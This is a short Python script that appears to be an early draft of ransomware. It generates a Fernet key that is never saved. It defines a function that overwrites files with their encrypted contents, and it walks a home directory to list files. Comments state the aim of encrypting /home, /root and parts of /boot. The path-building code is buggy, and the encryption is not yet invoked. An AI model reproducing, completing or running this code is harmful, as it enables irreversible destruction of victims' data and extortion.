import platform
from cryptography.fernet import Fernet
import os
import glob


# Generate the encryption key
key = Fernet.generate_key()
fernet = Fernet(key)

# Check what OS is currently running
system = platform.system() # Gets current OS
linux = False
windows = False

# Changes bool variables to current system
if system == "Linux":
    linux = True
    windows = False
elif system == "Windows":
    windows = True
    linux = False
else:
    linux = False
    windows = False

# Encryption Func
def encrypt(filename):
    with open(filename, 'rb') as file:
        file = file.read()
    
    encrypted = fernet.encrypt(file)

    with open(filename, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# If Linux
# Encrypt /home, /root, ceratin commands in /boot
dir_home_root = []
dir_home_dirs = []
dir_home_files = []
dir_to_encrypt = []

for roots, dirs, files in os.walk("/home/test"):
    dir_home_root.append(roots)
    dir_home_dirs.append(dirs)
    dir_home_files.append(files)
    dir_to_encrypt.append(os.path.join(str(roots),str(files)))


dir_home_files = [i for i in dir_home_files if i]

print("Roots: " + str(dir_home_root))
print("Dirs: " + str(dir_home_dirs))
print("Files: " + str(dir_home_files))
print("Encrypts: " + str(dir_to_encrypt))